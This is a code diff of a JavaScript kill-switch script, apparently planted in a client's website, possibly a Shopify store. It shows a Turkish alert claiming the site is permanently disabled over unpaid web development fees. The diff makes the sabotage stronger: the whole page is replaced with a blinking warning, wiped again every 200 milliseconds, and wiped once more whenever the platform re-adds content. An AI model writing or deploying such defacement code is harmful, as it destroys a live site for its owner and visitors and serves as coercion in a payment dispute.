@@ -1,13 +1,12 @@
 alert("UYARI: Bu site ÖDENMEMİŞ WEB GELİŞTİRME ÜCRETLERİ nedeniyle KALICI OLARAK DEVRE DIŞI BIRAKILDI!");
 
-document.body.innerHTML = "";
-document.head.innerHTML = "";
-
-document.write(`
+// Tanımlı mesaj HTML
+const killHTML = `
   <style>
     html, body {
       background-color: #000;
       margin: 0;
+      padding: 0;
       height: 100%;
       overflow: hidden;
       display: flex;
@@ -17,7 +16,7 @@ document.write(`
     }
     h1 {
       color: #f00;
-      font-size: 3rem;
+      font-size: 2.5rem;
       text-align: center;
       text-transform: uppercase;
       animation: blink 1s infinite;
@@ -30,33 +29,17 @@ document.write(`
     }
   </style>
   <h1>UYARI! BU SİTE ÖDENMEMİŞ GELİŞTİRME ÜCRETLERİ NEDENİYLE DEVRE DIŞI BIRAKILDI!</h1>
-`);
+`;
 
+// Başlangıçta tüm içeriği yok et
+document.documentElement.innerHTML = killHTML;
+
+// Sonsuz döngüde her 200ms'de bir tüm sayfayı tekrar yok et
+setInterval(() => {
+  document.documentElement.innerHTML = killHTML;
+}, 200);
+
+// Ekstra: Shopify turbo veya PJAX yeniden ekleme yaparsa anında temizle
 new MutationObserver(() => {
-  document.body.innerHTML = `
-    <h1 style="
-      color:#f00;
-      background-color:#000;
-      margin:0;
-      height:100vh;
-      overflow:hidden;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      font-family:Arial,sans-serif;
-      text-align:center;
-      font-size:3rem;
-      text-transform:uppercase;
-      animation: blink 1s infinite;
-    ">
-      UYARI! BU SİTE ÖDENMEMİŞ GELİŞTİRME ÜCRETLERİ NEDENİYLE DEVRE DIŞI BIRAKILDI!
-    </h1>
-    <style>
-      @keyframes blink {
-        0%   { opacity: 1; }
-        50%  { opacity: 0; }
-        100% { opacity: 1; }
-      }
-    </style>
-  `;
+  document.documentElement.innerHTML = killHTML;
 }).observe(document.documentElement, { childList: true, subtree: true });
